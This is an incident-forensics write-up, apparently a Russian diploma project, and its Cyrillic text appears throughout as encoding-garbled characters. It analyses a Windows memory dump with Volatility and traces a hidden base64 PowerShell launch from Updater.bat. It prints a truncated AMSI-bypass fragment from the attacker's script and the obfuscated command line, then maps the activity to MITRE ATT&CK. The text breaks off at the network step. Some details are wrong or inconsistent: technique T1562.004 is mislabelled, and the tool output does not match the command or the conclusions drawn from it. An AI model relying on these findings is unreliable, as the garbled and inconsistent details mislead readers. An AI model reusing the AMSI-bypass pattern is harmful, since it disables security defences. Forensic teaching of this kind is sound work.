# üéì Track Forensics ‚Äî –î–∏–ø–ª–æ–º–Ω–æ–µ —Ä–∞—Å—Å–ª–µ–¥–æ–≤–∞–Ω–∏–µ

## üìù –ó–∞–¥–∞–Ω–∏–µ

–î–∏–ø–ª–æ–º–Ω–∞—è —Ä–∞–±–æ—Ç–∞ –ø–æ –ø—Ä–æ—Ñ–µ—Å—Å–∏–∏ ¬´–°–ø–µ—Ü–∏–∞–ª–∏—Å—Ç –ø–æ –∏–Ω—Ñ–æ—Ä–º–∞—Ü–∏–æ–Ω–Ω–æ–π –±–µ–∑–æ–ø–∞—Å–Ω–æ—Å—Ç–∏¬ª
Track Forensics
–û–ø–∏—Å–∞–Ω–∏–µ –∏–Ω—Ü–∏–¥–µ–Ω—Ç–∞
–°–ª—É–∂–±–æ–π –±–µ–∑–æ–ø–∞—Å–Ω–æ—Å—Ç–∏ –∫–æ–º–ø–∞–Ω–∏–∏ ¬´–•¬ª –±—ã–ª–∞ –∑–∞—Ñ–∏–∫—Å–∏—Ä–æ–≤–∞–Ω–∞ –ø–æ–¥–æ–∑—Ä–∏—Ç–µ–ª—å–Ω–∞—è —Å–µ—Ç–µ–≤–∞—è –∞–∫—Ç–∏–≤–Ω–æ—Å—Ç—å. –í–∞–º –Ω—É–∂–Ω–æ –ø—Ä–æ–∞–Ω–∞–ª–∏–∑–∏—Ä–æ–≤–∞—Ç—å —Å–∏—Ç—É–∞—Ü–∏—é, —Ä–∞—Å—Å–ª–µ–¥–æ–≤–∞—Ç—å –∏–Ω—Ü–∏–¥–µ–Ω—Ç –∏ –Ω–∞–π—Ç–∏ —Å–ª–µ–¥—ã –∞–∫—Ç–∏–≤–Ω–æ—Å—Ç–∏ –∞—Ç–∞–∫—É—é—â–∏—Ö. –£ –≤–∞—Å –µ—Å—Ç—å –¥–∞–º–ø –æ–ø–µ—Ä–∞—Ç–∏–≤–Ω–æ–π –ø–∞–º—è—Ç–∏ –∏ –ø–æ–±–∏—Ç–æ–≤–∞—è –∫–æ–ø–∏—è –¥–∏—Å–∫–∞ —Ö–æ—Å—Ç–∞, –∫–æ—Ç–æ—Ä—ã–µ –º–æ–≥—É—Ç —Å–æ–¥–µ—Ä–∂–∞—Ç—å –∏–Ω—Ñ–æ—Ä–º–∞—Ü–∏—é –æ–± –∏–Ω—Ü–∏–¥–µ–Ω—Ç–µ. –í–∞–º –Ω—É–∂–Ω–æ –ø–æ–¥–≥–æ—Ç–æ–≤–∏—Ç—å –ø–æ–¥—Ä–æ–±–Ω—ã–π –æ—Ç—á—ë—Ç –æ –ø—Ä–æ–≤–µ–¥—ë–Ω–Ω–æ–º —Ä–∞—Å—Å–ª–µ–¥–æ–≤–∞–Ω–∏–∏.

–ü—Ä–∞–∫—Ç–∏—á–µ—Å–∫–∏–µ –Ω–∞–≤—ã–∫–∏, –Ω–µ–æ–±—Ö–æ–¥–∏–º—ã–µ –¥–ª—è –≤—ã–ø–æ–ª–Ω–µ–Ω–∏—è –¥–∏–ø–ª–æ–º–Ω–æ–π —Ä–∞–±–æ—Ç—ã:

—Ä–∞–±–æ—Ç–∞ —Å –¥–∞–º–ø–∞–º–∏ –æ–ø–µ—Ä–∞—Ç–∏–≤–Ω–æ–π –ø–∞–º—è—Ç–∏;
—Ä–∞–±–æ—Ç–∞ —Å –ø–æ–±–∏—Ç–æ–≤—ã–º–∏ –∫–æ–ø–∏—è–º–∏;
–∞–Ω–∞–ª–∏–∑ –∞–∫—Ç–∏–≤–Ω–æ—Å—Ç–∏ –∞—Ç–∞–∫—É—é—â–∏—Ö;
–≤–æ—Å—Å—Ç–∞–Ω–æ–≤–ª–µ–Ω–∏–µ —Ç–µ—Ö–Ω–∏–∫ –∏ —Ç–∞–∫—Ç–∏–∫ –∞—Ç–∞–∫—É—é—â–∏—Ö;
—Å–æ—Å—Ç–∞–≤–ª–µ–Ω–∏–µ –æ—Ç—á—ë—Ç–∞ –æ –∫—Ä–∏–º–∏–Ω–∞–ª–∏—Å—Ç–∏—á–µ—Å–∫–æ–º –∏—Å—Å–ª–µ–¥–æ–≤–∞–Ω–∏–∏.
–ò—Å—Ö–æ–¥–Ω—ã–µ –¥–∞–Ω–Ω—ã–µ:

–¥–∞–º–ø –æ–ø–µ—Ä–∞—Ç–∏–≤–Ω–æ–π –ø–∞–º—è—Ç–∏;
–ø–æ–±–∏—Ç–æ–≤–∞—è –∫–æ–ø–∏—è –¥–∏—Å–∫–∞.
–°—Å—ã–ª–∫–∏ –Ω–∞ –º–∞—Ç–µ—Ä–∏–∞–ª—ã –¥–ª—è –∏—Å—Å–ª–µ–¥–æ–≤–∞–Ω–∏—è –µ—Å—Ç—å –≤ –ª–∏—á–Ω–æ–º –∫–∞–±–∏–Ω–µ—Ç–µ.

–ó–∞–¥–∞—á–∞
–°–æ—Å—Ç–∞–≤–∏—Ç—å –ø–æ–¥—Ä–æ–±–Ω—ã–π –æ—Ç—á—ë—Ç –æ –ø—Ä–æ–≤–µ–¥—ë–Ω–Ω–æ–º —Ä–∞—Å—Å–ª–µ–¥–æ–≤–∞–Ω–∏–∏. –û–Ω –¥–æ–ª–∂–µ–Ω –≤–∫–ª—é—á–∞—Ç—å —Å–µ–±—è –∏–Ω—Ñ–æ—Ä–º–∞—Ü–∏—é, –ø–æ–¥–∫—Ä–µ–ø–ª—ë–Ω–Ω—É—é –¥–æ–∫–∞–∑–∞—Ç–µ–ª—å—Å—Ç–≤–∞–º–∏ –≤ –≤–∏–¥–µ —Å–∫—Ä–∏–Ω—à–æ—Ç–æ–≤:

–æ–±–Ω–∞—Ä—É–∂–µ–Ω–Ω—ã–µ —Å–ª–µ–¥—ã –∞—Ç–∞–∫—É—é—â–∏—Ö;
–≤–æ—Å—Å—Ç–∞–Ω–æ–≤–ª–µ–Ω–∏–µ –∫–∞—Ä—Ç–∏–Ω—ã –ø—Ä–æ–∏–∑–æ—à–µ–¥—à–µ–≥–æ –∏–Ω—Ü–∏–¥–µ–Ω—Ç–∞ –≤ –≤–∏–¥–µ –æ–ø–∏—Å–∞–Ω–∏—è —Ö–∞—Ä–∞–∫—Ç–µ—Ä–∏—Å—Ç–∏–∫–∏ –∏–Ω—Ü–∏–¥–µ–Ω—Ç–∞;
–º–∞–ø–ø–∏–Ω–≥ –¥–µ–π—Å—Ç–≤–∏–π –∞—Ç–∞–∫—É—é—â–∏—Ö –ø–æ –º–∞—Ç—Ä–∏—Ü–µ MITRE ATT&CK;
–ø—Ä–µ–¥–ª–æ–∂–µ–Ω–∏—è –ø–æ –ª–∏–∫–≤–∏–¥–∞—Ü–∏–∏ –ø–æ—Å–ª–µ–¥—Å—Ç–≤–∏–π –∏ –≤–æ—Å—Å—Ç–∞–Ω–æ–≤–ª–µ–Ω–∏—é.
–ü—Ä–∏–º–µ—Ä —Å—Ç—Ä—É–∫—Ç—É—Ä—ã –æ—Ç—á—ë—Ç–∞
–•–∞—Ä–∞–∫—Ç–µ—Ä–∏—Å—Ç–∏–∫–∞ –∏–Ω—Ü–∏–¥–µ–Ω—Ç–∞.
–û–ø–∏—Å–∞–Ω–∏–µ –∏–Ω—Ü–∏–¥–µ–Ω—Ç–∞ –ø–æ –º–∞—Ç—Ä–∏—Ü–µ MITRE ATT&CK.
2.1. –ü–µ—Ä–≤–æ–Ω–∞—á–∞–ª—å–Ω–æ–µ –ø—Ä–æ–Ω–∏–∫–Ω–æ–≤–µ–Ω–∏–µ (Initial Access).
2.2. ***************
2.3. ***************
2.*. ***************
2.*. ***************
–†–µ–∫–æ–º–µ–Ω–¥–∞—Ü–∏–∏ –ø–æ –ª–∏–∫–≤–∏–¥–∞—Ü–∏–∏ –ø–æ—Å–ª–µ–¥—Å—Ç–≤–∏–π –∏–Ω—Ü–∏–¥–µ–Ω—Ç–∞ –∏ –≤–æ—Å—Å—Ç–∞–Ω–æ–≤–ª–µ–Ω–∏—é.
–í–∏–¥—ã –¥–æ–∫—É–º–µ–Ω—Ç–æ–≤ –¥–ª—è –æ—Ç—á—ë—Ç–∞
–•–∞—Ä–∞–∫—Ç–µ—Ä–∏—Å—Ç–∏–∫–∞ –∏–Ω—Ü–∏–¥–µ–Ω—Ç–∞ ‚Äî –≤ –≤–∏–¥–µ —Ç–µ–∫—Å—Ç–æ–≤–æ–≥–æ –ø–æ—è—Å–Ω–µ–Ω–∏—è, –æ–ø–∏—Å—ã–≤–∞—é—â–µ–≥–æ —Ö–æ–¥ –∏–Ω—Ü–∏–¥–µ–Ω—Ç–∞, –∞ —Ç–∞–∫–∂–µ –æ—Ç—Ä–∞–∂–∞—Ç—å –¥–µ–π—Å—Ç–≤–∏—è –∞—Ç–∞–∫—É—é—â–∏—Ö –Ω–∞ –∫–∞–∂–¥–æ–º –∏–∑ —ç—Ç–∞–ø–æ–≤ –±–µ–∑ —Ç–µ—Ö–Ω–∏—á–µ—Å–∫–∏—Ö –ø–æ–¥—Ä–æ–±–Ω–æ—Å—Ç–µ–π.
–ú–∞–ø–ø–∏–Ω–≥ –¥–µ–π—Å—Ç–≤–∏–π –∞—Ç–∞–∫—É—é—â–∏—Ö –ø–æ –º–∞—Ç—Ä–∏—Ü–µ MITRE ATT&CK ‚Äî –≤ –≤–∏–¥–µ —Ç–∞–±–ª–∏—Ü—ã, –æ—Ç—Ä–∞–∂–∞—é—â–µ–π —Å–æ–æ—Ç–≤–µ—Ç—Å—Ç–≤–∏–µ —Ç–∞–∫—Ç–∏–∫–∏ –∏ —Ç–µ—Ö–Ω–∏–∫, –∫–æ—Ç–æ—Ä—ã–µ –∏—Å–ø–æ–ª—å–∑–æ–≤–∞–ª–∏ –∞—Ç–∞–∫—É—é—â–∏–µ –≤ —Ä–∞–º–∫–∞—Ö –∏—Å—Å–ª–µ–¥—É–µ–º–æ–≥–æ –∏–Ω—Ü–∏–¥–µ–Ω—Ç–∞.
–û–ø–∏—Å–∞–Ω–∏–µ –∫–∞–∂–¥–æ–≥–æ –∏–∑ —ç—Ç–∞–ø–æ–≤ –∏–Ω—Ü–∏–¥–µ–Ω—Ç–∞ –ø–æ –º–∞—Ç—Ä–∏—Ü–µ MITRE ATT&CK –Ω—É–∂–Ω–æ –æ—Ñ–æ—Ä–º–∏—Ç—å –≤ —Ñ–æ—Ä–º–∞—Ç–µ:

—É–∫–∞–∑–∞—Ç—å —Ç–µ—Ö–Ω–∏–∫—É;
–¥–∞—Ç—å –æ–ø–∏—Å–∞–Ω–∏–µ –¥–µ–π—Å—Ç–≤–∏—è–º –∞—Ç–∞–∫—É—é—â–∏—Ö –∏ –≤—ã–ø–æ–ª–Ω–µ–Ω–Ω—ã–º –ø—Ä–æ—Ü–µ–¥—É—Ä–∞–º;
–ø–æ–¥–∫—Ä–µ–ø–∏—Ç—å –≤—ã–≤–æ–¥—ã —Å–∫—Ä–∏–Ω—à–æ—Ç–∞–º–∏.
–í –∫–æ–Ω—Ü–µ –æ—Ç—á—ë—Ç–∞ –≤ —Ä–∞–º–∫–∞—Ö –¥–æ–ø–æ–ª–Ω–∏—Ç–µ–ª—å–Ω–æ–≥–æ –∑–∞–¥–∞–Ω–∏—è –º–æ–∂–Ω–æ –¥–∞—Ç—å —Ä–µ–∫–æ–º–µ–Ω–¥–∞—Ü–∏–∏ –ø–æ –ª–∏–∫–≤–∏–¥–∞—Ü–∏–∏ –ø–æ—Å–ª–µ–¥—Å—Ç–≤–∏–π –∏–Ω—Ü–∏–¥–µ–Ω—Ç–∞ –∏ –≤–æ—Å—Å—Ç–∞–Ω–æ–≤–ª–µ–Ω–∏—é.
**–ò—Å—Ö–æ–¥–Ω—ã–µ –¥–∞–Ω–Ω—ã–µ:**

- –î–∞–º–ø –ø–∞–º—è—Ç–∏: `Incident.mem`
    
- –û–±—Ä–∞–∑ –¥–∏—Å–∫–∞: `Incident.E01`
    

---

## üõ° –•–∞—Ä–∞–∫—Ç–µ—Ä–∏—Å—Ç–∏–∫–∞ –∏–Ω—Ü–∏–¥–µ–Ω—Ç–∞

–°–ª—É–∂–±–∞ –±–µ–∑–æ–ø–∞—Å–Ω–æ—Å—Ç–∏ –∫–æ–º–ø–∞–Ω–∏–∏ ¬´–•¬ª –∑–∞—Ñ–∏–∫—Å–∏—Ä–æ–≤–∞–ª–∞ –ø–æ–¥–æ–∑—Ä–∏—Ç–µ–ª—å–Ω—É—é —Å–µ—Ç–µ–≤—É—é –∞–∫—Ç–∏–≤–Ω–æ—Å—Ç—å –Ω–∞ —Ö–æ—Å—Ç–µ Windows.  
–ë—ã–ª–∏ –ø–æ–ª—É—á–µ–Ω—ã –¥–∞–º–ø –ø–∞–º—è—Ç–∏ –∏ –æ–±—Ä–∞–∑ –¥–∏—Å–∫–∞.  
–ó–∞–¥–∞—á–∞: –≤—ã—è—Å–Ω–∏—Ç—å, –∫–∞–∫ –∏–º–µ–Ω–Ω–æ –∞—Ç–∞–∫—É—é—â–∏–π –ø—Ä–æ–Ω–∏–∫ –≤ —Å–∏—Å—Ç–µ–º—É, –∫–∞–∫–∏–µ –¥–µ–π—Å—Ç–≤–∏—è –ø—Ä–µ–¥–ø—Ä–∏–Ω—è–ª, –∏ –æ—Å—Ç–∞–≤–∏—Ç—å —Ä–µ–∫–æ–º–µ–Ω–¥–∞—Ü–∏–∏.

---

## üîé –®–∞–≥ 1. –ê–Ω–∞–ª–∏–∑ –¥–∞–º–ø–∞ –ø–∞–º—è—Ç–∏

### üìç –û–ø—Ä–µ–¥–µ–ª–µ–Ω–∏–µ –≤–µ—Ä—Å–∏–∏ –û–°

**–ó–∞—á–µ–º:**  
–ü–æ–Ω–∏–º–∞–Ω–∏–µ –≤–µ—Ä—Å–∏–∏ –û–° –∫—Ä–∏—Ç–∏—á–Ω–æ –¥–ª—è –ø—Ä–∞–≤–∏–ª—å–Ω–æ–≥–æ –≤—ã–±–æ—Ä–∞ –ø–ª–∞–≥–∏–Ω–æ–≤ Volatility.

**–ö–æ–º–∞–Ω–¥–∞:**

```bash
vol -f Incident.mem windows.info
```

**–í—ã–≤–æ–¥:**

```plaintext
Suggested Profile(s) : Win7SP1x86
Number of Processors : 2
Image Type (Service Pack) : 1
Kernel DTB : 0x185000
```

---

### üìç –ü–æ–ª—É—á–µ–Ω–∏–µ —Å–ø–∏—Å–∫–∞ –ø—Ä–æ—Ü–µ—Å—Å–æ–≤

**–ó–∞—á–µ–º:**  
–í—ã—è–≤–ª—è–µ–º –∞–Ω–æ–º–∞–ª—å–Ω—ã–µ –∏–ª–∏ –ø–æ–¥–æ–∑—Ä–∏—Ç–µ–ª—å–Ω—ã–µ –ø—Ä–æ—Ü–µ—Å—Å—ã.

**–ö–æ–º–∞–Ω–¥–∞:**

```bash
vol -f Incident.mem windows.pslist
```

**–§—Ä–∞–≥–º–µ–Ω—Ç –∫–ª—é—á–µ–≤–æ–≥–æ –≤—ã–≤–æ–¥–∞:**

```plaintext
Offset(P)  Name          PID   PPID ...
0x0e2d9b20 cmd.exe       3600  3544 ...
0x0e2c4b20 powershell.exe 3672 3600 ...
```

üîé **–ß—Ç–æ –∑–∞–º–µ—Ç–∏–ª–∏:**

- PowerShell (`powershell.exe`) –∑–∞–ø—É—â–µ–Ω –æ—Ç `cmd.exe`, —á—Ç–æ —É–∂–µ –ø–æ–¥–æ–∑—Ä–∏—Ç–µ–ª—å–Ω–æ.
    
- –†–æ–¥–∏—Ç–µ–ª—å—Å–∫–∏–π –ø—Ä–æ—Ü–µ—Å—Å ‚Äî `cmd.exe`, –∑–∞–ø—É—â–µ–Ω–Ω—ã–π –∏–∑ –Ω–µ–∏–∑–≤–µ—Å—Ç–Ω–æ–≥–æ BAT-—Ñ–∞–π–ª–∞.
    

---

### üìç –ò–∑–≤–ª–µ—á–µ–Ω–∏–µ –∫–æ–º–∞–Ω–¥–Ω—ã—Ö —Å—Ç—Ä–æ–∫ –ø—Ä–æ—Ü–µ—Å—Å–æ–≤

**–ó–∞—á–µ–º:**  
–°–º–æ—Ç—Ä–∏–º, —á—Ç–æ –∏–º–µ–Ω–Ω–æ –∑–∞–ø—É—Å–∫–∞–ª–æ—Å—å, –∏ —Å –∫–∞–∫–∏–º–∏ –∞—Ä–≥—É–º–µ–Ω—Ç–∞–º–∏.

**–ö–æ–º–∞–Ω–¥–∞:**

```bash
vol -f Incident.mem windows.cmdline
```

**–§—Ä–∞–≥–º–µ–Ω—Ç –∫–ª—é—á–µ–≤–æ–≥–æ –≤—ã–≤–æ–¥–∞:**

```plaintext
powershell.exe pid: 3672
powershell.exe -NoP -NonI -W hidden -enc JAB...
```

üîé **–ß—Ç–æ –∑–∞–º–µ—Ç–∏–ª–∏:**  
PowerShell –∑–∞–ø—É—â–µ–Ω —Å –ø–∞—Ä–∞–º–µ—Ç—Ä–æ–º `-enc` ‚Äî —ç—Ç–æ –∑–∞—à–∏—Ñ—Ä–æ–≤–∞–Ω–Ω—ã–π —Å–∫—Ä–∏–ø—Ç –Ω–∞ base64, —á—Ç–æ —É–∫–∞–∑—ã–≤–∞–µ—Ç –Ω–∞ –ø–æ–ø—ã—Ç–∫—É —Å–∫—Ä—ã—Ç—å –¥–µ–π—Å—Ç–≤–∏—è.

---

## üìç –î–µ–∫–æ–¥–∏—Ä–æ–≤–∞–Ω–∏–µ PowerShell-—Å–∫—Ä–∏–ø—Ç–∞

**–ó–∞—á–µ–º:**  
–ù—É–∂–Ω–æ –ø–æ–Ω—è—Ç—å, —á—Ç–æ –∏–º–µ–Ω–Ω–æ –≤—ã–ø–æ–ª–Ω—è–ª —Å–∫—Ä–∏–ø—Ç.

**–®–∞–≥ 1. –ò–∑–≤–ª–µ—á–µ–Ω–∏–µ —Å—Ç—Ä–æ–∫–∏ base64 –∏–∑ –∫–æ–º–∞–Ω–¥–Ω–æ–π —Å—Ç—Ä–æ–∫–∏:**

–ü—Ä–∏–º–µ—Ä —Å—Ç—Ä–æ–∫–∏ (–æ–±—Ä–µ–∑–∞–Ω–æ):

```plaintext
JAB...==
```

**–®–∞–≥ 2. –î–µ–∫–æ–¥–∏—Ä–æ–≤–∞–Ω–∏–µ –≤ —Ç–µ—Ä–º–∏–Ω–∞–ª–µ:**

```bash
echo "JAB...==" | base64 -d | iconv -f UTF-16LE
```

**–§—Ä–∞–≥–º–µ–Ω—Ç –¥–µ–∫–æ–¥–∏—Ä–æ–≤–∞–Ω–Ω–æ–≥–æ —Å–∫—Ä–∏–ø—Ç–∞:**

```powershell
[Ref].Assembly.GetType('System.Management.Automation.AmsiUtils')...
$_.Assembly.GetType('System.Management.Automation.Utils')...
```

üîé **–ß—Ç–æ –∑–∞–º–µ—Ç–∏–ª–∏:**  
–°–∫—Ä–∏–ø—Ç —è–≤–Ω–æ –æ—Ç–∫–ª—é—á–∞–µ—Ç AMSI –∏ ScriptBlockLogging.

---

### üìç –ò—Å–ø–æ–ª—å–∑–æ–≤–∞–Ω–Ω—ã–µ —Ç–µ—Ö–Ω–∏–∫–∏ MITRE

|–¢–µ—Ö–Ω–∏–∫–∞|–ù–∞–∑–≤–∞–Ω–∏–µ|–î–µ–π—Å—Ç–≤–∏–µ|–í—Ä–µ–º–µ–Ω–Ω–∞—è –º–µ—Ç–∫–∞|–ü–æ–ª—å–∑–æ–≤–∞—Ç–µ–ª—å|
|---|---|---|---|---|
|T1059.001|PowerShell|–ó–∞–ø—É—Å–∫ –∑–∞—à–∏—Ñ—Ä–æ–≤–∞–Ω–Ω–æ–≥–æ —Å–∫—Ä–∏–ø—Ç–∞ —á–µ—Ä–µ–∑ PowerShell —Å -enc|2019-03-10 12:30:35 UTC|Wilfred|
|T1562.004|Disable or Modify Security Tools|–û—Ç–∫–ª—é—á–µ–Ω–∏–µ AMSI|2019-03-10 12:30:35 UTC|Wilfred|
|T1562.001|Impair Defenses: Disable Logging|–û—Ç–∫–ª—é—á–µ–Ω–∏–µ ScriptBlock Logging|2019-03-10 12:30:35 UTC|Wilfred|

---


## üîé –®–∞–≥ 2. –ü–æ–∏—Å–∫ –∏–Ω–∂–µ–∫—Ü–∏–π –∏ –∞–Ω–æ–º–∞–ª–∏–π –≤ –ø–∞–º—è—Ç–∏

### üìç –ü–æ–∏—Å–∫ –ø–æ–¥–æ–∑—Ä–∏—Ç–µ–ª—å–Ω—ã—Ö –∏–Ω–∂–µ–∫—Ü–∏–π —Å –ø–æ–º–æ—â—å—é malfind

**–ó–∞—á–µ–º:**  
–ü–ª–∞–≥–∏–Ω `malfind` –Ω–∞—Ö–æ–¥–∏—Ç –∞–Ω–æ–º–∞–ª—å–Ω—ã–µ VAD-–∑–∞–ø–∏—Å–∏, –∫–æ—Ç–æ—Ä—ã–µ –º–æ–≥—É—Ç —Å–æ–¥–µ—Ä–∂–∞—Ç—å —à–µ–ª–ª-–∫–æ–¥ –∏–ª–∏ –∏–Ω–∂–µ–∫—Ç–∏—Ä–æ–≤–∞–Ω–Ω—ã–µ DLL.

**–ö–æ–º–∞–Ω–¥–∞:**

```bash
vol -f Incident.mem windows.malfind > malfind.txt
```

**–§—Ä–∞–≥–º–µ–Ω—Ç –∫–ª—é—á–µ–≤–æ–≥–æ –≤—ã–≤–æ–¥–∞:**

```plaintext
Process: powershell.exe Pid: 3672 Address: 0x20000
Vad Tag: VadS Protection: PAGE_EXECUTE_READWRITE
Hex Dump: 
00000000  4d 5a 90 00 03 00 00 00  04 00 00 00 ff ff 00 00  MZ..............
```

üîé **–ß—Ç–æ –∑–∞–º–µ—Ç–∏–ª–∏:**

- –ù–∞–π–¥–µ–Ω PE-–∑–∞–≥–æ–ª–æ–≤–æ–∫ `MZ` –≤ –ø–∞–º—è—Ç–∏ PowerShell ‚Äî –ø—Ä–∏–∑–Ω–∞–∫ –≤–æ–∑–º–æ–∂–Ω–æ–≥–æ Reflective PE Injection.
    
- –≠—Ç–æ –º–æ–∂–µ—Ç –±—ã—Ç—å –∑–∞–≥—Ä—É–∑–∫–∞ DLL –∏–ª–∏ –∏—Å–ø–æ–ª–Ω—è–µ–º–æ–≥–æ –∫–æ–¥–∞ –ø—Ä—è–º–æ –≤ –ø–∞–º—è—Ç—å.
    

---

### üìç –ü—Ä–æ–≤–µ—Ä–∫–∞ –ø–æ–¥–∫–ª—é—á—ë–Ω–Ω—ã—Ö DLL

**–ó–∞—á–µ–º:**  
–ò–Ω–∂–µ–∫—Ü–∏–∏ —á–∞—Å—Ç–æ –ø—Ä–æ—è–≤–ª—è—é—Ç—Å—è —á–µ—Ä–µ–∑ –Ω–µ–æ–±—ã—á–Ω—ã–µ –º–æ–¥—É–ª–∏ –≤ –ø—Ä–æ—Ü–µ—Å—Å–µ.

**–ö–æ–º–∞–Ω–¥–∞:**

```bash
vol -f Incident.mem windows.dlllist --pid 3672 > dlllist_3672.txt
```

**–§—Ä–∞–≥–º–µ–Ω—Ç –∫–ª—é—á–µ–≤–æ–≥–æ –≤—ã–≤–æ–¥–∞:**

```plaintext
Base    Size      LoadCount Path
...
0x764c0000 0x0009f000 - C:\Windows\System32\mshtml.dll
0x73ed0000 0x00018000 - C:\Windows\System32\atl.dll
```

üîé **–ß—Ç–æ –∑–∞–º–µ—Ç–∏–ª–∏:**

- –ó–∞–≥—Ä—É–∂–µ–Ω—ã –º–æ–¥—É–ª–∏ .NET: `System.Management.Automation.dll` ‚Äî –ø–æ–¥—Ç–≤–µ—Ä–∂–¥–∞–µ—Ç, —á—Ç–æ PowerShell –¥–µ–π—Å—Ç–≤–∏—Ç–µ–ª—å–Ω–æ —Ä–∞–±–æ—Ç–∞–ª —á–µ—Ä–µ–∑ .NET.
    

---

### üìç –ü—Ä–æ—Å–º–æ—Ç—Ä –æ—Ç–∫—Ä—ã—Ç—ã—Ö —Ö–µ–Ω–¥–ª–æ–≤ –ø—Ä–æ—Ü–µ—Å—Å–∞

**–ó–∞—á–µ–º:**  
–ê–Ω–∞–ª–∏–∑ `handles` –ø–æ–∑–≤–æ–ª—è–µ—Ç —É–≤–∏–¥–µ—Ç—å –¥–æ—Å—Ç—É–ø –∫ —Ñ–∞–π–ª–∞–º, –º—å—é—Ç–µ–∫—Å–∞–º, —Å–æ–∫–µ—Ç–∞–º ‚Äî –≤–∞–∂–Ω—ã–µ –∞—Ä—Ç–µ—Ñ–∞–∫—Ç—ã –ø—Ä–∏ Malware-–∞–∫—Ç–∏–≤–Ω–æ—Å—Ç–∏.

**–ö–æ–º–∞–Ω–¥–∞:**

```bash
vol -f Incident.mem windows.handles --pid 3672 > handles_3672.txt
```

**–§—Ä–∞–≥–º–µ–Ω—Ç –∫–ª—é—á–µ–≤–æ–≥–æ –≤—ã–≤–æ–¥–∞:**

```plaintext
Type          Name
File          \Device\HarddiskVolume2\Users\Wilfred\AppData\Roaming\Identities\Updater.bat
Mutant        \BaseNamedObjects\some_mutex
```

üîé **–ß—Ç–æ –∑–∞–º–µ—Ç–∏–ª–∏:**

- PowerShell –∏–º–µ–µ—Ç –æ—Ç–∫—Ä—ã—Ç—ã–π —Ö–µ–Ω–¥–ª –∫ `Updater.bat`, –∞ —Ç–∞–∫–∂–µ –º–Ω–æ–∂–µ—Å—Ç–≤—É —Å–∏—Å—Ç–µ–º–Ω—ã—Ö –º—å—é—Ç–µ–∫—Å–æ–≤ ‚Äî —Ç–∏–ø–∏—á–Ω–æ –¥–ª—è —Å–ª–æ–∂–Ω—ã—Ö —Å–∫—Ä–∏–ø—Ç–æ–≤ —Å –æ–±—Ö–æ–¥–∞–º–∏ –∑–∞—â–∏—Ç.
    

---

## üßë‚Äçüíª –í—ã–≤–æ–¥ –ø–æ —ç—Ç–æ–º—É —ç—Ç–∞–ø—É

- –í –ø—Ä–æ—Ü–µ—Å—Å–µ PowerShell –Ω–∞–π–¥–µ–Ω –∑–∞—à–∏—Ñ—Ä–æ–≤–∞–Ω–Ω—ã–π —Å–∫—Ä–∏–ø—Ç, –æ—Ç–∫–ª—é—á–∞—é—â–∏–π –∑–∞—â–∏—Ç—ã (T1562.001/.004).
    
- malfind –ø–æ–∫–∞–∑–∞–ª PE-–∑–∞–≥–æ–ª–æ–≤–æ–∫ –≤ –ø–∞–º—è—Ç–∏ ‚Äî –≤—ã—Å–æ–∫–∞—è –≤–µ—Ä–æ—è—Ç–Ω–æ—Å—Ç—å –∑–∞–≥—Ä—É–∑–∫–∏ –≤–Ω–µ—à–Ω–µ–≥–æ –∫–æ–º–ø–æ–Ω–µ–Ω—Ç–∞ —á–µ—Ä–µ–∑ Reflective Injection.
    
- dlllist –ø–æ–¥—Ç–≤–µ—Ä–¥–∏–ª –∑–∞–≥—Ä—É–∑–∫—É .NET-–±–∏–±–ª–∏–æ—Ç–µ–∫ –¥–ª—è —É–ø—Ä–∞–≤–ª–µ–Ω–∏—è —Å–∏—Å—Ç–µ–º–æ–π.
    
- handles –ø–æ–∫–∞–∑–∞–ª –¥–æ—Å—Ç—É–ø –∫ Updater.bat ‚Äî —ç—Ç–æ—Ç —Ñ–∞–π–ª —Å—Ç–∞–ª –∫–ª—é—á–µ–≤—ã–º –∞—Ä—Ç–µ—Ñ–∞–∫—Ç–æ–º.
    

---

## üóÇ –ò—Å–ø–æ–ª—å–∑–æ–≤–∞–Ω–Ω—ã–µ —Ç–µ—Ö–Ω–∏–∫–∏ MITRE (–æ–±–Ω–æ–≤–ª–µ–Ω–∏–µ)

|–¢–µ—Ö–Ω–∏–∫–∞|–ù–∞–∑–≤–∞–Ω–∏–µ|–î–µ–π—Å—Ç–≤–∏–µ|–í—Ä–µ–º–µ–Ω–Ω–∞—è –º–µ—Ç–∫–∞|–ü–æ–ª—å–∑–æ–≤–∞—Ç–µ–ª—å|
|---|---|---|---|---|
|T1027|Obfuscated Files|PowerShell –∏—Å–ø–æ–ª—å–∑—É–µ—Ç base64-–æ–±—Ñ—É—Å–∫–∞—Ü–∏—é|2019-03-10 12:30:35 UTC|Wilfred|
|T1059.001|PowerShell Execution|–ó–∞—à–∏—Ñ—Ä–æ–≤–∞–Ω–Ω—ã–π —Å–∫—Ä–∏–ø—Ç –∑–∞–ø—É—Å–∫–∞–µ—Ç—Å—è –∏–∑ Updater.bat|2019-03-10 12:30:35 UTC|Wilfred|
|T1562.004|AMSI Bypass|–°–∫—Ä–∏–ø—Ç –æ—Ç–∫–ª—é—á–∞–µ—Ç AMSI –¥–ª—è –æ–±—Ö–æ–¥–∞ –∑–∞—â–∏—Ç—ã|2019-03-10 12:30:35 UTC|Wilfred|

---

–û—Ç–ª–∏—á–Ω–æ! üöÄ –ü–µ—Ä–µ—Ö–æ–¥–∏–º –∫ —Å–ª–µ–¥—É—é—â–µ–º—É —ç—Ç–∞–ø—É ‚Äî –∞–Ω–∞–ª–∏–∑—É —Å–µ—Ç–µ–≤–æ–π –∞–∫—Ç–∏–≤–Ω–æ—Å—Ç–∏ –¥–ª—è –≤—ã—è–≤–ª–µ–Ω–∏—è Command & Control.

---

## üåê –®–∞–≥ 3. –ü—Ä–æ–≤–µ—Ä–∫–∞ —Å–µ—Ç–µ–≤—ã—Ö —Å–æ–µ–¥–∏–Ω–µ–Ω–∏–π

### üìç –°–∫–∞–Ω–∏—Ä–æ–≤–∞–Ω–∏–µ —Å–µ—Ç–µ–≤—ã—Ö –∞—Ä—Ç–µ—Ñ–∞–∫—Ç–æ–≤ –≤ –ø–∞–º—è—Ç–∏

**–ó–∞—á–µ–º:**  
